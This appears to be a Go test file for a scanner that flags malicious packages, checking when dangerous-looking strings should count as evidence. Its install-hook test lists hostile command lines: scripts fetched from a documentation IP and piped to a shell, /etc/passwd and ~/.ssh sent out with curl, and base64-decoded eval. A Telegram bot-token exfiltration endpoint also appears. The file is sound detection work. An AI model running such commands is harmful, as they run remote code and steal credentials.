package detect

import "testing"

// Pass 11 (2026-10-18). A rescan of mints withdrawn as stale still judged 22 of them malicious
// under the current engine, and every one was a false positive of a rule that treats a STRING in
// library source as if it were an action:
//
//	P-PASSWD-READ  10  path-traversal tests and docstrings: os.path.join(dest, "/etc/passwd")
//	P-CURL-PIPE     5  install hints: {"Linux": "curl -f https://zed.dev/install.sh | sh"}
//	P-EVAL-BASE64   1  prose: "the eval-binding ROOT COMMITMENT (root_b64, a non-empty base64 string)"
//
// Each of these is evidence only where it runs unattended -- an install hook. A library's
// runtime source merely mentions it. Ground truth (OpenSSF malicious-packages, pypi, name join):
// 5 of 1,200 packages carrying P-PASSWD-READ, 1 of 1,147 for P-CURL-PIPE and 1 of 114 for
// P-EVAL-BASE64 are confirmed malicious, and none of those lacks other evidence.

func libraryMints(eco, src string) bool {
	return CombinedVerdict(Detect(&PackageContext{Name: "pkg", Ecosystem: eco, PkgbuildContent: src})).Malicious
}

func hookMints(eco, src string) bool {
	return CombinedVerdict(Detect(&PackageContext{Name: "pkg", Ecosystem: eco, InstallScriptContent: src})).Malicious
}

func TestLibrarySourceMentioningADangerousStringDoesNotMint(t *testing.T) {
	for _, tc := range []struct{ eco, line string }{
		{"pypi", `        ("/etc/shadow",     "data_leakage",  0.30),`},
		{"pypi", `process can write (note os.path.join(dest, "/etc/passwd") is just`},
		{"pypi", `>>> check_url("file:///etc/passwd")`},
		{"pypi", `arbitrary ref, so a value like ../../x or /etc/passwd could`},
		{"cargo", `let p = Path::new("/etc/passwd"); assert!(!is_contained(p, root));`},
		{"pypi", `"Linux":   "curl -f https://zed.dev/install.sh | sh",`},
		{"pypi", `MOVED = "human moved: curl -fsSL https://doashuman.com/install.sh | bash"`},
		{"pypi", `    f"curl -sSfL {base}/import-odoo.sh | bash -s -- "`},
		{"packagist", `echo "curl -sS https://getcomposer.org/installer | php"`},
		{"pypi", "payload carries the eval-binding ROOT COMMITMENT (``receipt.root_b64``, a non-empty base64 string)"},
		{"pypi", `("~/.ssh/id_*", "s"), ("~/.ssh/config", "s"),`},
		{"pypi", `url = f"https://api.telegram.org/bot{token}/sendMessage"`},
		{"pypi", `ENDPOINT = "https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage"`},
	} {
		if libraryMints(tc.eco, tc.line) {
			t.Errorf("%s library line minted malware: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, PkgbuildContent: tc.line})))
		}
	}
}

func TestSetupBuildStepsAreNotEvidence(t *testing.T) {
	for _, line := range []string{
		`subprocess.check_call(["cmake", ext.sourcedir] + cmake_args, cwd=self.build_temp)`,
		`ghash = subprocess.check_output(["git", "rev-parse", "HEAD"]).decode("ascii")`,
		`subprocess.run(["git", "-C", str(root), "lfs", "pull"], check=True)`,
		`os.system("python setup.py sdist upload")`,
	} {
		if hookMints("pypi", line) {
			t.Errorf("setup.py build step minted malware: %q", line)
		}
	}
}

func TestTheSameStringsStillMintWhereTheyRunUnattended(t *testing.T) {
	for _, tc := range []struct{ eco, line string }{
		{"pypi", `curl -fsSL http://203.0.113.9/x.sh | sh`},
		{"npm", `wget -qO- http://203.0.113.9/x.sh | bash`},
		{"pypi", `cat /etc/passwd | curl -s -d @- http://203.0.113.9/in`},
		{"pypi", `tar c ~/.ssh/ | curl -s -T - http://203.0.113.9/in`},
		{"pypi", `eval "$(echo ZWNobyBoaQ== | base64 -d)"`},
		{"pypi", `eval(base64.b64decode(blob))`},
		{"pypi", `echo ZWNobyBoaQ== | base64 -d | eval`},
	} {
		if !hookMints(tc.eco, tc.line) {
			t.Errorf("%s install hook did not mint: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, InstallScriptContent: tc.line})))
		}
	}
}

// A literal bot token is hostile wherever it sits: a library author never ships their own.
func TestTelegramBotTokenIsEvidenceInLibrarySource(t *testing.T) {
	line := `ENDPOINT = "https://api.telegram.org/bot8759663177:AAH3EBXqymku9MUAtu73uPKvNLFmkhM256s/sendMessage"`
	if !libraryMints("pypi", line) {
		t.Errorf("a hard-coded Telegram bot token should mint; findings=%v", ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: line})))
	}
}

func TestSetupHostReconIsEvidence(t *testing.T) {
	line := `_host = subprocess.check_output(["hostname"]).decode(errors="replace").strip()`
	if !hookMints("pypi", line) {
		t.Errorf("setup.py fingerprinting the host should mint; findings=%v", ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", InstallScriptContent: line})))
	}
	if hookMints("pypi", `subprocess.check_output(["git", "describe", "--tags"])`) {
		t.Error("git describe in setup.py must not mint")
	}
}
